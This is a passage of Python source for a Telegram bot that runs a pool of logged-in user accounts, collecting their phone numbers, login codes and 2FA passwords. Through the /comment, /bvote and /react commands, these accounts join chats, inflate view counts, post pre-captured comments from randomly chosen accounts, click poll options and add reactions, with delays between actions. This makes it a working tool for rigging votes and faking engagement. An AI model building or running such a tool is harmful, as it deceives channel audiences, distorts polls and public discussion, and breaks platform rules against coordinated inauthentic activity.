    state = {"t": None, "status": None}  # idle-timer task + last status message

    async def _announce_after_idle():
        try:
            await asyncio.sleep(ADD_IDLE_TIMEOUT)
        except asyncio.CancelledError:
            return
        total = len(admin_comments.get(user_id, []))
        # remove the previous status message so only the latest one stays
        if state["status"] is not None:
            try:
                await state["status"].delete()
            except Exception:
                pass
        state["status"] = await client.send_message(
            user_id,
            f"✅ **Added {total} to the comments.**\nClick **Done** to finish capturing.",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("✅ Done", callback_data=f"add_done:{user_id}")
            ]]),
        )

    async def _capture_comment(c: Client, m):
        if m.from_user is None or m.from_user.id != user_id:
            return
        if m.text and m.text.startswith("/"):
            return  # commands still work normally
        if m.text:
            admin_comments[user_id].append({"type": "text", "content": m.text})
        elif m.sticker:
            admin_comments[user_id].append({"type": "sticker", "content": m.sticker.file_id})
        elif m.animation or m.video:
            try:
                file_path = await m.download()
            except Exception:
                return
            admin_comments[user_id].append({"type": "gif", "content": file_path})
        else:
            return
        # (re)start the inactivity timer on every captured message
        if state["t"]:
            state["t"].cancel()
        state["t"] = asyncio.create_task(_announce_after_idle())

    handler = MessageHandler(_capture_comment)
    app.add_handler(handler)
    add_handlers[user_id] = handler
    await message.reply(
        "💬 **Capturing comments.**\n"
        "Send any text, sticker, or GIF — each is saved as a comment.\n"
        "After a short pause I'll show the count with a **Done** button."
    )

@app.on_callback_query(filters.regex(r"^add_done:"))
async def add_done_callback(client, callback_query):
    user_id = callback_query.from_user.id
    handler = add_handlers.pop(user_id, None)
    if handler is None:
        await callback_query.answer("No active capture.", show_alert=False)
        return
    app.remove_handler(handler)
    total = len(admin_comments.get(user_id, []))
    await callback_query.answer("Capture stopped.")
    await callback_query.message.edit_text(
        f"⏹️ **Capture stopped.** {total} comment(s) saved.\n"
        "Use /comment to post them, /clear to wipe them."
    )

@app.on_message(filters.command("clear"))
async def clear_comments(client, message):
    if not is_admin(message.from_user.id):
        await message.reply("⛔ **Unauthorized:** You do not have permission to perform this action.")
        return

    admin_comments[message.from_user.id] = []
    user_path = 'downloads'
    if os.path.exists(user_path):
        shutil.rmtree(user_path, ignore_errors=True)
    await message.reply("🧹 All pending comments have been cleared.")

# Handler to send all comments back to the admin
@app.on_message(filters.command("comments"))
async def send_all_comments(client: Client, message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.reply("⛔ **Unauthorized:** You do not have permission to perform this action.")
        return

    if user_id not in admin_comments or not admin_comments[user_id]:
        await message.reply("ℹ️ No comments have been added yet.")
        return

    for comment in admin_comments[user_id]:
        if comment["type"] == "text":
            await message.reply(comment["content"])
        elif comment["type"] == "sticker":
            await message.reply_sticker(comment["content"])
        elif comment["type"] == "gif":
            await message.reply_animation(comment["content"])
@app.on_message(filters.command("cancel"))
async def cancel_comment_process(client, message):
    if not is_admin(message.from_user.id):
        await message.reply("⛔ **Unauthorized:** You do not have permission to perform this action.")
        return

    cancel_process[message.from_user.id] = True
    user_path = 'downloads'
    if os.path.exists(user_path):
        shutil.rmtree(user_path, ignore_errors=True)
    await message.reply("🚫 Commenting process has been canceled.")

# Function to post comments (from Pyrogram handler)
@app.on_message(filters.command("bvote"))
async def vote_on_button(client, message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        return await message.reply("⛔ **Unauthorized:** You do not have permission to perform this action.")
    
    import re
    match = re.match(r'/bvote(?:@\w+)?\s+(\d+)\s+(\d+)\s+(\d+)\s+(\S+)\s+(\d+)', message.text)
    if not match:
        return await message.reply("⚠️ **Incorrect Usage!**\n\n📌 **Usage:** `/bvote [option] [count] [msg_id] [chat] [delay]`\n*Example:* `/bvote 0 5 123 @chat 2`")

    poll_index = int(match.group(1))
    num_clients_to_vote = int(match.group(2))
    message_id = int(match.group(3))
    join_url = match.group(4)
    sleep_time = int(match.group(5))
    
    await message.reply(f"🚀 **Starting Task:** Clicking button option {poll_index + 1} with up to {num_clients_to_vote} client(s)...")

    voted_users = 0
    for sender in list(songs_client.keys()):
        if voted_users >= num_clients_to_vote:
            break
            
        user_client = clients.get(sender)
        try:
            chat = await get_or_join_chat(user_client, join_url)
            msg = await user_client.get_messages(chat.id, message_id)
            await safe_view_messages(user_client, chat.id, message_id, message)
            await msg.click(poll_index)
            voted_users += 1
            await message.reply(f"✅ Client `{sender}` clicked option {poll_index + 1}.")
            await asyncio.sleep(sleep_time)
        except Exception as e:
            await message.reply(f"⚠️ Client `{sender}` failed to click button: {e}")
    
    await message.reply(f"🔘 Button vote completed: {voted_users}/{num_clients_to_vote} client(s) clicked.")


@app.on_message(filters.command("comment"))
async def comment_on_post(client, message):
    user_id = message.from_user.id

    # Ensure the user is an admin
    if not is_admin(user_id):
        await message.reply("⛔ **Unauthorized:** You do not have permission to perform this action.")
        return

    await cleanup_memory()
    
    import re
    match = re.match(r'/comment(?:@\w+)?\s+(\S+)\s+(\d+)\s+(\d+)', message.text)
    if not match:
        return await message.reply("⚠️ **Incorrect Usage!**\n\n📌 **Usage:** `/comment [chat] [msg_id] [delay]`\n*Example:* `/comment @channel 123 2`")

    # Extract the channel link/username and message ID from the command
    channel_username_or_link = match.group(1)
    message_id = int(match.group(2))
    sleep_time = int(match.group(3))
    # Check if the admin has any comments
    if user_id not in admin_comments or not admin_comments[user_id]:
        await message.reply("ℹ️ No comments added. Use /add to add comments first.")
        return

    commented_users = 0
    available_clients = list(songs_client.keys())

    # Ensure there are enough clients to handle all comments
    if len(available_clients) < len(admin_comments[user_id]):
        await message.reply("⚠️ **Insufficient Clients:** Not enough active clients available for all comments.")
        return

    # Reset cancel flag for the current process
    cancel_process[user_id] = False

    await message.reply(f"🚀 **Starting Task:** Posting {len(admin_comments[user_id])} comment(s)...")

    for comment in admin_comments[user_id]:
        # If cancel is triggered, break out of the loop
        if cancel_process.get(user_id, False):
            await message.reply("🚫 Commenting process was canceled.")
            break

        # Randomly select a client from available_clients and remove it from the list
        sender = random.choice(available_clients)
        user_client = clients.get(sender)
        available_clients.remove(sender)

        try:
            # Join or get the chat
            try:
               channel = await user_client.join_chat(channel_username_or_link)
            except:
               channel = await user_client.get_chat(channel_username_or_link)

            # Get the discussion message
            discussion_message = await user_client.get_discussion_message(channel.id, message_id)
            try:
                 await user_client.view_messages(channel.id, message_id)
            except Exception as e:
                 await message.reply(f"⚠️ Client `{sender}` failed to increase view count: {e}")

            # Comment by replying to the discussion message
            if comment['type'] == 'text':
                await discussion_message.reply(comment['content'])
            elif comment['type'] == 'sticker':
                await discussion_message.reply_sticker(comment['content'])
            elif comment['type'] == 'gif':
                await discussion_message.reply_animation(comment['content'])
                os.remove(comment['content'])
            commented_users += 1
            await asyncio.sleep(sleep_time)  # delay
            await message.reply(f"💬 Client `{sender}` successfully posted comment on **{channel.title}**.")

        except Exception as e:
            await message.reply(f"⚠️ Error commenting with client `{sender}`: {e}")
            continue

    # Clean up the comments after posting
    admin_comments[user_id] = []

    if not cancel_process.get(user_id, False):
        await message.reply(f"✅ Finished posting comments with {commented_users} client(s).")

@app.on_message(filters.command("react"))
async def react_to_post(client, message):
    if not is_admin(message.from_user.id):
        await message.reply("⛔ **Unauthorized:** You do not have permission to perform this action.")
        return

    import re
    match = re.match(r'/react(?:@\w+)?\s+(\d+)\s+(\S+)\s+(\d+)\s+(\S+)', message.text)
    if not match:
        return await message.reply("⚠️ **Incorrect Usage!**\n\n📌 **Usage:** `/react [count] [chat] [msg_id] [emoji]`\n*Example:* `/react 5 @channel 123 👍`")

    num_clients_to_join = int(match.group(1))
    channel_username_or_link = match.group(2)
    message_id = int(match.group(3))
    emoji = match.group(4)
    reacted_users = 0

    await message.reply(f"🚀 **Starting Task:** Reacting to post with up to {num_clients_to_join} client(s)...")

    for client_id in list(clients.keys()):
        if reacted_users >= num_clients_to_join:
            break
            
        user_client = clients.get(client_id)
        try:
            channel = await get_or_join_chat(user_client, channel_username_or_link)
            msg = await user_client.get_messages(channel.id, message_ids=message_id)
            await safe_view_messages(user_client, channel.id, message_id, message)
            await msg.react(emoji=emoji)
            reacted_users += 1
        except Exception as e:
            await message.reply(f"⚠️ Error reacting with client `{client_id}`: {e}")

    await message.reply(f"😍 Reaction task completed: {reacted_users} client(s) reacted.")

# ==================== System Management ====================

async def execute_git_commands() -> str:
    """Execute git update commands and return formatted output"""
    commands = [
        "git reset --hard",
        "git stash",
        "git pull",
        "pip install -r requirements.txt"
    ]

    results = []
    for cmd in commands:
        try:
            process = subprocess.Popen(
                cmd, shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            stdout, stderr = process.communicate()

            if process.returncode == 0:
                output = stdout.strip() if stdout.strip() else "(Command executed successfully)"
                results.append(f"$ {cmd}\n{output}")
            else:
                results.append(f"$ {cmd}\nError: {stderr}")
        except Exception as e:
            results.append(f"$ {cmd}\nException: {str(e)}")

    return "\n\n".join(results)

@app.on_message(filters.command("pull"))
async def pull_handler(client, message):
    if not is_admin(message.from_user.id):
        return
    
    msg = await message.reply("🔄 Executing git repository updates...")
    result = await execute_git_commands()
    await msg.edit(f"```\n{result}\n```")

# Handle continuation of the /login flow (contact / code / 2FA password) and the
# /logout confirmation. Runs in group -1 (before the comment-mode handler in group
# 0) and stops propagation once it consumes an input, so the two flows never clash.
@app.on_message(filters.private, group=-1)
async def login_state_dispatcher(client, message):
    sender = message.from_user.id
    state = login_states.get(sender)
    is_command = bool(message.text) and message.text.startswith("/")

    if state:
        # A command mid-flow (e.g. /cancel, /ping) abandons login and runs normally.
        if is_command:
            login_states.pop(sender, None)
            c = clients.pop(sender, None)
            if c:
                try:
                    await c.disconnect()
                except Exception:
                    pass
            return
        step = state.get("step")
        if step == "phone":
            await _handle_login_phone(message)
        elif step == "code":
            await _handle_login_code(message)
        elif step == "password":
            await _handle_login_password(message)
        else:
            login_states.pop(sender, None)
        message.stop_propagation()

    elif logout_pending.get(sender):
        if is_command:
            logout_pending.pop(sender, None)
            return
        await _handle_logout_confirmation(message)
        message.stop_propagation()

# ==================== Main Execution ====================

if __name__ == "__main__":
    try:
        logger.info("Starting bot...")
        loop = asyncio.get_event_loop()
        loop.run_until_complete(run_all_clients())
        logger.info("Bot is running...")
        # Use asyncio to keep running independently of bot connection state
        loop.run_forever()
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
    finally:
        logger.info("Bot shutdown complete")
